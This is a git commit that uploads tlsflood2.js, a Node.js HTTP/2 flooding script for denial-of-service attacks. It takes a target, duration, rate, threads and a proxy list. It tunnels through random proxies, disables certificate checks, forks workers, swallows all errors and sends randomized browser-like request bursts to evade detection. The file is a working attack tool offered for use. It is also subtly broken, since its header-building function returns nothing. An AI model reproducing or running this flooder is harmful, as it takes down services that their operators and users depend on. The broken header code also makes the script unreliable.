c4739da1952b0e4fced95bdbdd286a1e0c908bcb
wannatermux <80704106+wannatermux@users.noreply.github.com>
2025-12-23 21:47:04 +0500

    Add files via upload

---
+++ tlsflood2.js
@@ -0,0 +1,216 @@
+const net = require("net");
+const http2 = require("http2");
+const tls = require("tls");
+const cluster = require("cluster");
+const url = require("url");
+const fs = require("fs");
+const { SocksClient } = require("socks");
+
+process.setMaxListeners(0);
+require("events").EventEmitter.defaultMaxListeners = 0;
+process.on('uncaughtException', function (exception) {});
+
+if (process.argv.length < 7){
+    console.log(`node tlsflood2.js target time rate thread proxyfile`);
+    process.exit();
+}
+
+function readLines(filePath) {
+    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
+}
+
+function randomIntn(min, max) {
+    return Math.floor(Math.random() * (max - min) + min);
+}
+
+function randomElement(elements) {
+    return elements[randomIntn(0, elements.length)];
+}
+
+function randomString(length) {
+    let result = '';
+    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+    for (let i = 0; i < length; i++) {
+        result += characters.charAt(Math.floor(Math.random() * characters.length));
+    }
+    return result;
+}
+
+const args = {
+    target: process.argv[2],
+    time: ~~process.argv[3],
+    Rate: ~~process.argv[4],
+    threads: ~~process.argv[5],
+    proxyFile: process.argv[6]
+};
+
+var proxies = readLines(args.proxyFile);
+const parsedTarget = url.parse(args.target);
+
+if (cluster.isMaster) {
+    for (let counter = 1; counter <= args.threads; counter++) {
+        cluster.fork();
+    }
+} else {
+    setInterval(runFlooder, 0);
+}
+
+class NetSocket {
+    constructor() {}
+
+    HTTP(options, callback) {
+        const parsedAddr = options.address.split(":");
+        const addrHost = parsedAddr[0];
+        const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
+        const buffer = Buffer.from(payload);
+
+        const connection = net.connect({
+            host: options.host,
+            port: options.port
+        });
+
+        connection.setTimeout(options.timeout * 600000);
+        connection.setKeepAlive(true, 100000);
+
+        connection.on("connect", () => {
+            connection.write(buffer);
+        });
+
+        connection.on("data", chunk => {
+            const response = chunk.toString("utf-8");
+            const isAlive = response.includes("HTTP/1.1 200");
+            if (!isAlive) {
+                connection.destroy();
+                return callback(undefined, "bad proxy");
+            }
+            return callback(connection, undefined);
+        });
+
+        connection.on("timeout", () => {
+            connection.destroy();
+            callback(undefined, "timeout");
+        });
+
+        connection.on("error", () => {
+            connection.destroy();
+            callback(undefined, "error");
+        });
+    }
+}
+
+const Socker = new NetSocket();
+
+const fetch_site = ["same-origin", "same-site", "cross-site"];
+const fetch_mode = ["navigate", "same-origin", "no-cors", "cors"];
+const fetch_dest = ["document", "sharedworker", "worker"];
+
+const languages = [
+    "en-US,en;q=0.9",
+    "en-GB,en;q=0.8",
+    "es-ES,es;q=0.9",
+    "fr-FR,fr;q=0.9,en;q=0.8",
+    "de-DE,de;q=0.9,en;q=0.8",
+    "zh-CN,zh;q=0.9,en;q=0.8",
+    "ja-JP,ja;q=0.9,en;q=0.8"
+];
+
+const useragents = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0"
+];
+
+const referers = [
+    "https://www.google.com/",
+    "https://www.bing.com/",
+    "https://duckduckgo.com/",
+    "https://www.yahoo.com/",
+    "https://www.baidu.com/",
+    ""
+];
+
+function buildHeaders() {
+    const headers = {
+        ":method": "GET",
+        ":scheme": "https",
+        ":authority": parsedTarget.host,
+        ":path": parsedTarget.path,
+        "user-agent": randomElement(useragents),
+        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
+        "accept-language": randomElement(languages),
+        "accept-encoding": "gzip, deflate, br",
+        "sec-fetch-site": randomElement(fetch_site),
+        "sec-fetch-dest": randomElement(fetch_dest),
+        "sec-fetch-mode": randomElement(fetch_mode),
+        "upgrade-insecure-requests": "1"
+    };
+}
+
+function runFlooder() {
+    const proxyAddr = randomElement(proxies);
+    const parsedProxy = proxyAddr.split(":");
+    
+    const proxyOptions = {
+        host: parsedProxy[0],
+        port: ~~parsedProxy[1],
+        address: parsedTarget.host + ":443",
+        timeout: 100,
+    };
+
+    Socker.HTTP(proxyOptions, (connection, error) => {
+        if (error) return
+
+        connection.setKeepAlive(true, 600000);
+        
+        const tlsOptions = {
+            ALPNProtocols: ['h2'],
+            rejectUnauthorized: false,
+            socket: connection,
+            servername: parsedTarget.host
+        };
+
+        const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
+        tlsConn.setKeepAlive(true, 60000);
+
+        const client = http2.connect(parsedTarget.href, {
+            protocol: "https:",
+            settings: {
+                maxConcurrentStreams: 1000,
+                initialWindowSize: 65535,
+                enablePush: false,
+            },
+            maxSessionMemory: 32000,
+            maxDeflateDynamicTableSize: 4294967295,
+            createConnection: () => tlsConn,
+            socket: connection,
+        });
+
+        client.on("connect", () => {
+            setInterval(() => {
+                for (let i = 0; i < args.Rate; i++) {
+                    const headers = buildHeaders();
+                    const request = client.request(headers);
+                    request.on("response", () => {
+                        request.close();
+                        request.destroy();
+                        return
+                    });
+                    request.end();
+                }
+            }, 1000);
+        });
+        client.on("close", () => {
+            client.destroy();
+            connection.destroy();
+            return
+        });
+    });
+}
+
+const KillScript = () => process.exit(1);
+setTimeout(KillScript, args.time * 1000);
